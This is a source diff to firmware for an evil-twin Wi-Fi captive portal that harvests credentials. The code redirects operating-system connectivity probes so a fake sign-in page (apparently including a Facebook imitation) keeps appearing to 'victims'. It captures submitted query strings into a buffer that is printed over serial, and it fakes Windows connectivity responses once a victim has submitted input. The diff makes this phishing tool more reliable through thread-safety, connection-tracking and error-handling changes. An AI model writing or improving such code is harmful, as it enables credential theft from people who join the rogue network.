@@ -1,13 +1,80 @@
 #include "web_lwip.h"
+#include "petrel_http.h"   // pure predicates (host-tested in common/petrel_http_test.c)
 #include <lwip/tcp.h>
 #include <lwip/pbuf.h>
 #include <lwip/ip_addr.h>
 #include <lwip/mem.h>
+// Declared locally instead of including <lwip/tcpip.h>: that header pulls sys.h, whose sys_now()
+// collides with the core's C-linkage declaration.
+extern "C" {
+typedef void (*web_tcpip_cb)(void* ctx);
+err_t tcpip_callback_with_block(web_tcpip_cb function, void* ctx, u8_t block);
+}
 #include <string.h>
+// Declared here instead of including <Arduino.h>: that header pulls WCharacter.h, which needs a
+// ctype.h this toolchain's C++ wrapper does not provide in a plain .cpp TU.
+extern "C" {
+unsigned long millis(void);
+void delay(unsigned long ms);
+}
+
+// Acquire/release accessors: volatile alone is not a C++ synchronization primitive on this
+// weakly-ordered part, and a bare DMB does not make the accesses atomic.
+#define WEB_LOAD(p)      __atomic_load_n((p), __ATOMIC_ACQUIRE)
+#define WEB_STORE(p, v)  __atomic_store_n((p), (v), __ATOMIC_RELEASE)
+#define WEB_ADD(p, v)    __atomic_add_fetch((p), (v), __ATOMIC_RELAXED)
+static bool web_cb_done;   // tcpip hand-off completion (see web_in_tcpip)
+struct web_fn_arg { void (*fn)(const void*); const void* arg; };
+static void web_apply_edits(void);
 
 static struct tcp_pcb* web_listen = NULL;
 static void (*web_render)(char*, size_t) = NULL;
 static void (*web_rotate)(void) = NULL;
+static web_resolve_fn web_resolve = NULL;
+static unsigned g_sends = 0;   // responses currently streaming (their body pointer must stay valid)
+
+// One record per accepted connection: it owns the optional send cursor and is the single tcp_arg,
+// so tcp_err can always untrack even when no response has started yet. A stop aborts every record -
+// closing the listener alone would leave connections running against state the next start resets.
+#define WEB_CONNS 4
+struct web_conn { struct tcp_pcb* pcb; struct web_send* ws; };
+static struct web_conn* g_conns[WEB_CONNS];
+
+static struct web_conn* conn_add(struct tcp_pcb* p) {
+    for (unsigned i = 0; i < WEB_CONNS; i++) {
+        if (!g_conns[i]) {
+            struct web_conn* c = (struct web_conn*)mem_malloc(sizeof(struct web_conn));
+            if (!c) return NULL;
+            c->pcb = p; c->ws = NULL;
+            g_conns[i] = c;
+            return c;
+        }
+    }
+    return NULL;
+}
+
+static void conn_del(struct web_conn* c) {
+    for (unsigned i = 0; i < WEB_CONNS; i++) if (g_conns[i] == c) g_conns[i] = NULL;
+}
+
+static void conn_free(struct web_conn* c) {
+    if (!c) return;
+    conn_del(c);
+    if (c->ws) { mem_free(c->ws); if (g_sends) g_sends--; }
+    mem_free(c);
+}
+
+static void web_abort_conns(void) {
+    for (unsigned i = 0; i < WEB_CONNS; i++) {
+        if (!g_conns[i]) continue;
+        struct tcp_pcb* p = g_conns[i]->pcb;
+        conn_free(g_conns[i]);
+        tcp_arg(p, NULL);   // tcp_abort fires tcp_err; the record is already gone
+        tcp_abort(p);
+    }
+    WEB_STORE(&g_sends, 0u);
+    web_apply_edits();
+}
 static bool web_portal = false;
 
 // Selected captive-portal page, set by web_lwip_start_portal(): the .ino resolves the chosen
@@ -29,7 +96,8 @@ static char g_root[64] = "http://192.168.4.1/";
 // and cp.json flips to captive:false. Un-authorized clients still get a 302 to the portal, so the
 // sign-in keeps popping for new victims. Keyed on the peer IPv4 (tpcb->remote_ip).
 static uint32_t g_authed[8];
-static uint8_t  g_authed_n = 0;
+static uint8_t  g_authed_n = 0;   // entries used, saturates at 8
+static uint8_t  g_authed_next = 0; // eviction cursor (a real ring, not "always slot 0")
 
 static bool ip_authed(uint32_t ip) {
     for (uint8_t i = 0; i < g_authed_n; i++) if (g_authed[i] == ip) return true;
@@ -38,20 +106,40 @@ static bool ip_authed(uint32_t ip) {
 
 static void ip_mark_authed(uint32_t ip) {
     if (!ip || ip_authed(ip)) return;
-    g_authed[g_authed_n % 8] = ip;
+    g_authed[g_authed_next] = ip;
+    g_authed_next = (uint8_t)((g_authed_next + 1) % 8);
     if (g_authed_n < 8) g_authed_n++;
 }
 
-// Single-slot credential queue: web_recv runs in the tcpip thread and must NOT touch Serial1
+// Bounded credential ring (4 slots): web_recv runs in the tcpip thread and must NOT touch Serial1
 // (two threads on one UART -> corruption; a blocking UART write stalls the stack). So it parks the
 // captured query string here and loop() drains + prints EV: via web_lwip_poll_creds().
-static volatile bool g_creds_ready = false;
-static char g_creds[96];
+// SPSC: producer owns g_creds_tail, consumer owns g_creds_head; a DMB publishes the slot before the
+// index (volatile alone is not enough on this weakly-ordered part).
+#define CRED_SLOTS 4
+#define CRED_LEN   96
+static char     g_creds[CRED_SLOTS][CRED_LEN];
+static unsigned g_creds_head = 0;   // consumer
+static unsigned g_creds_tail = 0;   // producer
+static unsigned g_creds_drop = 0;
+
+static bool creds_push(const char* q) {
+    unsigned t = WEB_LOAD(&g_creds_tail);
+    unsigned h = WEB_LOAD(&g_creds_head);
+    if ((t + 1) % CRED_SLOTS == h) { WEB_ADD(&g_creds_drop, 1u); return false; }
+    size_t n = strlen(q);
+    if (n > CRED_LEN - 1) n = CRED_LEN - 1;
+    memcpy(g_creds[t], q, n);
+    g_creds[t][n] = 0;
+    WEB_STORE(&g_creds_tail, (t + 1) % CRED_SLOTS);   // release: slot visible before the index
+    return true;
+}
+
 
 // Per-connection send cursor for the (possibly large, e.g. 39KB facebook) portal body: the body
 // can exceed one tcp_sndbuf, so it is streamed across tcp_sent callbacks. Allocated in web_recv,
 // freed on completion, on tcp_err, and on peer FIN (a victim that drops mid-send must not leak it).
-struct web_send { const char* body; int len; int off; u8_t copy; };
+struct web_send { const char* body; int len; int off; u8_t copy; void* conn; };
 
 // Shared scratch for the WebUI page and the cp.json body (the two never run at the same time:
 // WebUI mode and portal mode are mutually exclusive).
@@ -79,17 +167,25 @@ static const char NO_CONTENT_RESP[] =
     "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nCache-Control: no-store\r\n"
     "Connection: close\r\n\r\n";
 
-// OS connectivity-probe URLs -> 302 to the portal root, which triggers the sign-in popup.
-static bool is_probe(const char* path) {
-    static const char* pr[] = {"generate_204", "gen_204", "ncsi", "hotspot",
-                               "connecttest", "success", "redirect", "canonical"};
-    for (unsigned i = 0; i < sizeof(pr) / sizeof(pr[0]); i++)
-        if (strstr(path, pr[i])) return true;
-    return false;
-}
-
 static err_t web_poll(void* arg, struct tcp_pcb* tpcb) {
     (void)arg; tcp_abort(tpcb); return ERR_ABRT;   // drop a stalled half-open connection
+}
+
+// tcp_close() can fail with ERR_MEM (it has to allocate a FIN). Retrying on the poll callback is the
+// documented pattern; if it fails again the connection is aborted rather than left dangling.
+static err_t web_poll_close(void* arg, struct tcp_pcb* tpcb) {
+    (void)arg;
+    if (tcp_close(tpcb) == ERR_OK) return ERR_OK;
+    tcp_abort(tpcb);
+    return ERR_ABRT;
+}
+
+static void web_close(struct tcp_pcb* tpcb) {
+    if (tcp_close(tpcb) == ERR_OK) return;
+    tcp_arg(tpcb, NULL);
+    tcp_sent(tpcb, NULL);
+    tcp_err(tpcb, NULL);
+    tcp_poll(tpcb, web_poll_close, 2 /* ~1s */);
 }
 
 // Build "HTTP/1.1 200 OK ... [Content-Encoding: gzip] Content-Length: <bl>\r\n\r\n" into hdr
@@ -109,12 +205,13 @@ static int http_hdr(char* hdr, size_t bl, bool gzip) {
 
 // Release the send cursor + unhook callbacks, then close. Called once the whole body is queued,
 // and (with ws==NULL) for the small single-write responses that need no cursor.
-static void web_finish(struct tcp_pcb* tpcb, struct web_send* ws) {
+static void web_finish(struct tcp_pcb* tpcb, struct web_conn* c) {
     tcp_arg(tpcb, NULL);
     tcp_sent(tpcb, NULL);
     tcp_err(tpcb, NULL);
-    if (ws) mem_free(ws);
-    tcp_close(tpcb);
+    conn_free(c);
+    if (WEB_LOAD(&g_sends) == 0) web_apply_edits();
+    web_close(tpcb);
 }
 
 // Queue as much of the remaining body as tcp_sndbuf allows; the tcp_sent callback resumes this
@@ -130,43 +227,53 @@ static err_t web_send_body(struct tcp_pcb* tpcb, struct web_send* ws) {
         if (ws->off + chunk < ws->len) flags |= TCP_WRITE_FLAG_MORE;
         err_t e = tcp_write(tpcb, ws->body + ws->off, (u16_t)chunk, flags);
         if (e == ERR_MEM) { tcp_output(tpcb); return ERR_OK; } // pbufs exhausted: retry on tcp_sent
-        if (e != ERR_OK) { web_finish(tpcb, ws); return ERR_OK; }
+        if (e != ERR_OK) { web_finish(tpcb, (struct web_conn*)ws->conn); return ERR_OK; }
         ws->off += chunk;
     }
     tcp_output(tpcb);
-    web_finish(tpcb, ws);   // all bytes queued
+    web_finish(tpcb, (struct web_conn*)ws->conn);   // all bytes queued
     return ERR_OK;
 }
 
 static err_t web_sent(void* arg, struct tcp_pcb* tpcb, u16_t len) {
     (void)len;
-    struct web_send* ws = (struct web_send*)arg;
-    if (ws) return web_send_body(tpcb, ws);
+    struct web_conn* c = (struct web_conn*)arg;
+    if (c && c->ws) return web_send_body(tpcb, c->ws);
     return ERR_OK;
 }
 
 static void web_err(void* arg, err_t err) {
     (void)err;
-    if (arg) mem_free(arg);   // peer aborted/reset mid-send: pcb already freed by lwIP, free cursor
+    // lwIP has already freed the pcb; only our record and cursor remain.
+    conn_free((struct web_conn*)arg);
+    if (WEB_LOAD(&g_sends) == 0) web_apply_edits();   // a pending edit must not wait for a request
 }
 
-// Small single-write response (fits one sndbuf by construction). Returns false if it did not fit.
+// Small single-write response (fits one sndbuf by construction). Returns false if it did not fit or
+// a write failed - a free sndbuf does not guarantee the pbuf allocation succeeds.
 static bool web_small(struct tcp_pcb* tpcb, const char* a, const char* b, const char* c) {
     size_t n = strlen(a) + (b ? strlen(b) : 0) + (c ? strlen(c) : 0);
     if (tcp_sndbuf(tpcb) < (u16_t)n) return false;
-    tcp_write(tpcb, a, (u16_t)strlen(a), TCP_WRITE_FLAG_COPY);
-    if (b) tcp_write(tpcb, b, (u16_t)strlen(b), TCP_WRITE_FLAG_COPY);
-    if (c) tcp_write(tpcb, c, (u16_t)strlen(c), TCP_WRITE_FLAG_COPY);
+    if (tcp_write(tpcb, a, (u16_t)strlen(a), TCP_WRITE_FLAG_COPY) != ERR_OK) return false;
+    if (b && tcp_write(tpcb, b, (u16_t)strlen(b), TCP_WRITE_FLAG_COPY) != ERR_OK) return false;
+    if (c && tcp_write(tpcb, c, (u16_t)strlen(c), TCP_WRITE_FLAG_COPY) != ERR_OK) return false;
     tcp_output(tpcb);
     return true;
 }
 
+static void web_resolve_now(void);
+
 static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err) {
     (void)err;
+    struct web_conn* c = (struct web_conn*)arg;
     if (p == NULL) {                       // peer closed: free any in-flight cursor, then close
-        web_finish(tpcb, (struct web_send*)arg);
+        web_finish(tpcb, c);
         return ERR_OK;
     }
+    // A further segment while a response is still streaming (POST body, extra headers) must not
+    // re-enter: it would restart the response and leak the cursor. Just drain it.
+    if (c && c->ws) { tcp_recved(tpcb, p->tot_len); pbuf_free(p); return ERR_OK; }
+
     // copy the request line out of the FIRST pbuf before freeing (most GETs fit one segment)
     char req[200];
     u16_t rl = p->len < (u16_t)(sizeof(req) - 1) ? p->len : (u16_t)(sizeof(req) - 1);
@@ -180,13 +287,13 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
             web_render(g_body, sizeof(g_body));
             size_t bl = strlen(g_body);
             char hdr[160]; int hl = http_hdr(hdr, bl, false);
-            if (tcp_sndbuf(tpcb) >= (u16_t)(hl + (int)bl)) {
-                tcp_write(tpcb, hdr, (u16_t)hl, TCP_WRITE_FLAG_COPY);
-                tcp_write(tpcb, g_body, (u16_t)bl, TCP_WRITE_FLAG_COPY);
+            if (tcp_sndbuf(tpcb) >= (u16_t)(hl + (int)bl) &&
+                tcp_write(tpcb, hdr, (u16_t)hl, TCP_WRITE_FLAG_COPY) == ERR_OK &&
+                tcp_write(tpcb, g_body, (u16_t)bl, TCP_WRITE_FLAG_COPY) == ERR_OK) {
                 tcp_output(tpcb);
             }
         }
-        tcp_close(tpcb);
+        web_finish(tpcb, c);
         return ERR_OK;
     }
 
@@ -194,7 +301,7 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
     char* path = NULL;
     char* sp = strchr(req, ' ');
     if (sp) { path = sp + 1; char* sp2 = strchr(path, ' '); if (sp2) *sp2 = 0; }
-    if (!path || !*path) { tcp_close(tpcb); return ERR_OK; }
+    if (!path || !*path) { web_finish(tpcb, c); return ERR_OK; }
 
     const uint32_t peer = ip_addr_get_ip4_u32(&tpcb->remote_ip);
     bool authed = ip_authed(peer);
@@ -203,15 +310,14 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
     // authorize the client, and advance the portal rotation (if enabled).
     char* q = strchr(path, '?');
     if (q && strchr(q, '=')) {
-        if (!g_creds_ready) {
-            size_t n = strlen(q + 1);
-            if (n > sizeof(g_creds) - 1) n = sizeof(g_creds) - 1;
-            memcpy(g_creds, q + 1, n); g_creds[n] = 0;
-            g_creds_ready = true;              // loop() drains + prints "EV:<query>"
+        creds_push(q + 1);                     // loop() drains + prints "EV:<query>"
+        // Only a credential-shaped query authorizes and rotates; an incidental tracking parameter
+        // must not clear the sign-in prompt for that client.
+        if (petrel_is_cred_submit(q + 1)) {
+            ip_mark_authed(peer);
+            authed = true;
+            if (web_rotate) web_rotate();
         }
-        ip_mark_authed(peer);
-        authed = true;
-        if (web_rotate) web_rotate();
     }
 
     if (strncmp(path, "/cp.json", 8) == 0) {
@@ -223,43 +329,63 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
         strcpy(body + strlen(body), "\"}");
         if (!web_small(tpcb, "HTTP/1.1 200 OK\r\nContent-Type: application/captive+json\r\n"
                              "Connection: close\r\n\r\n", body, NULL)) {
-            tcp_close(tpcb); return ERR_OK;
+            web_finish(tpcb, c); return ERR_OK;
         }
-        tcp_close(tpcb);
+        web_finish(tpcb, c);
         return ERR_OK;
     }
-    if (is_probe(path)) {
+    if (petrel_is_probe_path(path)) {
         if (authed) {
-            if (!web_small(tpcb, NO_CONTENT_RESP, NULL, NULL)) { tcp_close(tpcb); return ERR_OK; }
+            // Windows NCSI/connecttest validate a BODY, not just a status: a bare 204 leaves the
+            // warning up there. Everything else takes the empty 204.
+            const char* body = NULL;
+            const char* ctype = "text/plain";
+            if (petrel_probe_wants_body(path)) {
+                body = strstr(path, "ncsi") ? "Microsoft NCSI" : "Microsoft Connect Test";
+            }
+            if (body) {
+                if (!web_small(tpcb, "HTTP/1.1 200 OK\r\nContent-Type: ", ctype,
+                               "\r\nConnection: close\r\n\r\n") ||
+                    !web_small(tpcb, body, NULL, NULL)) { web_finish(tpcb, c); return ERR_OK; }
+            } else if (!web_small(tpcb, NO_CONTENT_RESP, NULL, NULL)) {
+                web_finish(tpcb, c); return ERR_OK;
+            }
         } else if (!web_small(tpcb, REDIRECT_HEAD, g_root, REDIRECT_TAIL)) {
-            tcp_close(tpcb); return ERR_OK;
+            web_finish(tpcb, c); return ERR_OK;
         }
-        tcp_close(tpcb);
+        web_finish(tpcb, c);
         return ERR_OK;
     }
 
     // --- serve the SELECTED portal page (streamed: body may exceed one sndbuf) ---
+    if (WEB_LOAD(&g_sends) == 0) { web_apply_edits(); web_resolve_now(); }   // never mid-stream
     const char* body = g_portal_body ? g_portal_body : PORTAL_BODY;
     int len          = g_portal_body ? g_portal_len  : (int)(sizeof(PORTAL_BODY) - 1);
     bool gzip        = g_portal_body ? g_portal_gzip : false;
     bool copy        = g_portal_body ? g_portal_copy : false;
 
     char hdr[180]; int hl = http_hdr(hdr, (size_t)len, gzip);
-    if (tcp_sndbuf(tpcb) < (u16_t)hl) { tcp_close(tpcb); return ERR_OK; }  // header must fit first
-    tcp_write(tpcb, hdr, (u16_t)hl, TCP_WRITE_FLAG_COPY);                  // header on stack: copy
+    if (tcp_sndbuf(tpcb) < (u16_t)hl) { web_finish(tpcb, c); return ERR_OK; }  // header must fit
+    if (tcp_write(tpcb, hdr, (u16_t)hl, TCP_WRITE_FLAG_COPY) != ERR_OK) {      // header on stack
+        web_finish(tpcb, c); return ERR_OK;
+    }
 
     struct web_send* ws = (struct web_send*)mem_malloc(sizeof(struct web_send));
-    if (!ws) { tcp_output(tpcb); tcp_close(tpcb); return ERR_OK; }         // no body, header only
-    ws->body = body; ws->len = len; ws->off = 0; ws->copy = copy ? 1 : 0;
-    tcp_arg(tpcb, ws);
+    if (!ws) { tcp_output(tpcb); web_finish(tpcb, c); return ERR_OK; }         // header only
+    ws->body = body; ws->len = len; ws->off = 0; ws->copy = copy ? 1 : 0; ws->conn = c;
+    c->ws = ws;
+    WEB_ADD(&g_sends, 1u);
     tcp_sent(tpcb, web_sent);
-    tcp_err(tpcb, web_err);        // free the cursor if the peer resets mid-send
     return web_send_body(tpcb, ws);
 }
 
 static err_t web_accept(void* arg, struct tcp_pcb* newpcb, err_t err) {
     (void)arg; (void)err;
     if (newpcb == NULL) return ERR_VAL;
+    struct web_conn* c = conn_add(newpcb);
+    if (!c) { tcp_abort(newpcb); return ERR_ABRT; }   // no slot: refuse rather than track nothing
+    tcp_arg(newpcb, c);
+    tcp_err(newpcb, web_err);                        // installed now, not only once streaming
     tcp_recv(newpcb, web_recv);
     tcp_poll(newpcb, web_poll, 8 /* ~4s */);
     return ERR_OK;
@@ -278,45 +404,185 @@ static bool web_listen_start() {
     return true;
 }
 
+// The raw API is not thread-safe and this port runs with LWIP_TCPIP_CORE_LOCKING=0, so every pcb
+// list mutation is marshalled into the tcpip thread (blocking, so the callers keep sync semantics).
+// The configuration globals are published BEFORE the callback runs; only tcpip callbacks read them.
+struct web_lifecycle { bool start; bool ok; };
+
+static void web_lifecycle_cb(void* ctx) {
+    struct web_lifecycle* lc = (struct web_lifecycle*)ctx;
+    if (lc->start) {
+        web_abort_conns();          // a start while active must not inherit old cursors
+        // Session state is reset HERE, after the abort: resetting it in the caller would let a
+        // receive callback see g_sends == 0 while an old stream still holds a page pointer.
+        g_creds_head = 0; g_creds_tail = 0; g_creds_drop = 0;
+        g_authed_n = 0; g_authed_next = 0;
+        web_resolve_now();          // page pointer published in the tcpip thread
+        lc->ok = web_listen_start();
+    } else {
+        web_abort_conns();
+        if (web_listen) { tcp_close(web_listen); web_listen = NULL; }
+    }
+    WEB_STORE(&web_cb_done, true);
+}
+
+// tcpip_callback_with_block(block=1) only waits until the message is POSTED, not until the callback
+// has run, so stack arguments would expire. The arguments are therefore static (every caller is
+// loop()) and a done flag gives the caller synchronous semantics - a callback that arrives late is
+// still safe because its storage outlives it.
+// Waits until the callback has actually RUN. Every caller is loop(), so operations never overlap -
+// that is what makes the single done flag and the static arguments safe. Both waits are unbounded:
+// the tcpip thread always drains its mailbox and frees the message, and the AP lifecycle already
+// depends on it. There is deliberately no direct-call fallback - running raw lwIP calls from loop()
+// while tcpip is live is exactly what this exists to avoid.
+static void web_in_tcpip(web_tcpip_cb fn, void* ctx) {
+    WEB_STORE(&web_cb_done, false);
+    while (tcpip_callback_with_block(fn, ctx, 1) != ERR_OK) delay(1);   // pool exhausted: retry
+    while (!WEB_LOAD(&web_cb_done)) delay(1);   // acquire: the callback's writes are visible
+}
+
+static struct web_lifecycle web_lc;   // static: the callback may outlive this call
+
+static bool web_lifecycle(bool start) {
+    web_lc.start = start; web_lc.ok = false;
+    web_in_tcpip(web_lifecycle_cb, &web_lc);
+    return web_lc.ok;
+}
+
 bool web_lwip_start(void (*render)(char* buf, size_t cap)) {
     web_render = render; web_portal = false;
-    return web_listen_start();
+    return web_lifecycle(true);
 }
 
-bool web_lwip_start_portal(const char* body, int len, bool gzip, bool copy) {
-    web_render = NULL; web_portal = true; g_creds_ready = false;
-    g_authed_n = 0;
-    g_portal_body = (body && len > 0) ? body : NULL;
-    g_portal_len  = len; g_portal_gzip = gzip; g_portal_copy = copy;
-    return web_listen_start();
+static void web_set_resolver_cb(void* ctx) {
+    web_resolve = *(web_resolve_fn*)ctx;
+    WEB_STORE(&web_cb_done, true);
 }
 
-void web_lwip_set_portal(const char* body, int len, bool gzip, bool copy) {
-    g_portal_body = (body && len > 0) ? body : NULL;
-    g_portal_len  = len; g_portal_gzip = gzip; g_portal_copy = copy;
+static web_resolve_fn web_resolver_arg;
+
+void web_lwip_set_resolver(web_resolve_fn fn) {
+    web_resolver_arg = fn;
+    web_in_tcpip(web_set_resolver_cb, &web_resolver_arg);
+}
+
+// Re-resolve the page. Only called when no response is streaming, so the previous body pointer is
+// no longer referenced by anyone.
+static void web_resolve_now(void) {
+    const char* b = NULL; int l = 0; bool g = false, c = false;
+    if (web_resolve) web_resolve(&b, &l, &g, &c);
+    g_portal_body = (b && l > 0) ? b : NULL;
+    g_portal_len  = l; g_portal_gzip = g; g_portal_copy = c;
+}
+
+bool web_lwip_start_portal(void) {
+    web_render = NULL; web_portal = true;
+    return web_lifecycle(true);   // aborts stale conns, resets state and resolves in tcpip
+}
+
+struct web_url_args { const char* root; };
+
+static void web_set_urls_cb(void* ctx) {
+    const char* root = ((struct web_url_args*)ctx)->root;
+    if (root && root[0]) {
+        strncpy(g_root, root, sizeof(g_root) - 1); g_root[sizeof(g_root) - 1] = 0;
+    }
+    WEB_STORE(&web_cb_done, true);
 }
 
 void web_lwip_set_urls(const char* root, const char* cpjson) {
     (void)cpjson;   // the cp.json URL is derived from root at request time
-    if (root && root[0]) {
-        strncpy(g_root, root, sizeof(g_root) - 1); g_root[sizeof(g_root) - 1] = 0;
-    }
+    static struct web_url_args a;
+    a.root = root;
+    web_in_tcpip(web_set_urls_cb, &a);
 }
 
-void web_lwip_set_rotate(void (*fn)(void)) { web_rotate = fn; }
+static void web_set_rotate_cb(void* ctx) {
+    web_rotate = *(void (**)(void))ctx;
+    WEB_STORE(&web_cb_done, true);
+}
+
+static void (*web_rotate_arg)(void);
+
+void web_lwip_set_rotate(void (*fn)(void)) {
+    web_rotate_arg = fn;
+    web_in_tcpip(web_set_rotate_cb, &web_rotate_arg);
+}
 
 bool web_lwip_poll_creds(char* buf, int cap) {
-    if (!g_creds_ready) return false;
-    int n = (int)strlen(g_creds);
+    unsigned h = WEB_LOAD(&g_creds_head);
+    if (h == WEB_LOAD(&g_creds_tail)) return false;   // acquire: slot visible after the index
+    int n = (int)strlen(g_creds[h]);
     if (n > cap - 1) n = cap - 1;
-    memcpy(buf, g_creds, n); buf[n] = 0;
-    g_creds_ready = false;
+    memcpy(buf, g_creds[h], n); buf[n] = 0;
+    WEB_STORE(&g_creds_head, (h + 1) % CRED_SLOTS);   // release: slot drained
     return true;
 }
 
+unsigned web_lwip_creds_dropped(void) { return WEB_LOAD(&g_creds_drop); }
+
+// customPortal edits run in the tcpip thread and only while no response is streaming: a stream keeps
+// the pointer and the ORIGINAL length, so rewriting the bytes under it would mix old and new content.
+// Exactly one edit can be outstanding (every caller blocks), so a single pending slot is enough.
+// If a stream refuses to finish, the caller's bounded wait aborts the connections, which guarantees
+// progress instead of letting a busy client starve loop().
+static void (*g_edit_fn)(const void*);
+static const void* g_edit_arg;
+static bool g_edit_pending;
+
+static void web_apply_edits(void) {   // tcpip thread, only when idle
+    static bool running = false;
+    if (!WEB_LOAD(&g_edit_pending) || running || WEB_LOAD(&g_sends) != 0) return;
+    running = true;
+    void (*fn)(const void*) = g_edit_fn;
+    const void* arg = g_edit_arg;
+    fn(arg);                          // execute FIRST: the waiter's argument must still be alive
+    running = false;
+    WEB_STORE(&g_edit_pending, false);   // release: the caller may now read the result and drop `arg`
+}
+
+static void web_portal_edit_cb(void* ctx) {
+    (void)ctx;
+    web_apply_edits();
+    WEB_STORE(&web_cb_done, true);
+}
+
+static void web_abort_cb(void* ctx) { (void)ctx; web_abort_conns(); WEB_STORE(&web_cb_done, true); }
+
+// Read-only run in tcpip: no idle requirement, so a status read never disturbs a download.
+static void web_in_tcpip_cb(void* ctx) {
+    const struct web_fn_arg* e = (const struct web_fn_arg*)ctx;
+    e->fn(e->arg);
+    WEB_STORE(&web_cb_done, true);
+}
+
+void web_lwip_in_tcpip(void (*fn)(const void*), const void* arg) {
+    static struct web_fn_arg e;
+    e.fn = fn; e.arg = arg;
+    web_in_tcpip(web_in_tcpip_cb, &e);
+}
+
+void web_lwip_portal_edit(void (*fn)(const void*), const void* arg) {
+    g_edit_fn = fn; g_edit_arg = arg;
+    WEB_STORE(&g_edit_pending, true);   // release: the slot is visible before it is published
+    web_in_tcpip(web_portal_edit_cb, NULL);
+    // Wait for the edit to actually run: the argument may be a temporary and the reply must be
+    // truthful. The bound below covers the CLIENT side only; the marshal above additionally waits
+    // for the tcpip thread to service the callback, which the whole AP lifecycle depends on anyway.
+    uint32_t t0 = millis();
+    while (WEB_LOAD(&g_edit_pending) && (uint32_t)(millis() - t0) < 2000) delay(1);
+    if (WEB_LOAD(&g_edit_pending)) {
+        web_in_tcpip(web_abort_cb, NULL);   // drop the streams, which lets the edit land
+        t0 = millis();
+        while (WEB_LOAD(&g_edit_pending) && (uint32_t)(millis() - t0) < 2000) delay(1);
+    }
+}
+
+
 void web_lwip_stop() {
-    if (web_listen) { tcp_close(web_listen); web_listen = NULL; }
-    web_portal = false; g_creds_ready = false;
+    web_lifecycle(false);
+    web_portal = false;
+    g_creds_head = 0; g_creds_tail = 0;
     g_portal_body = NULL; g_portal_len = 0;
-    g_authed_n = 0;
+    g_authed_n = 0; g_authed_next = 0;
 }
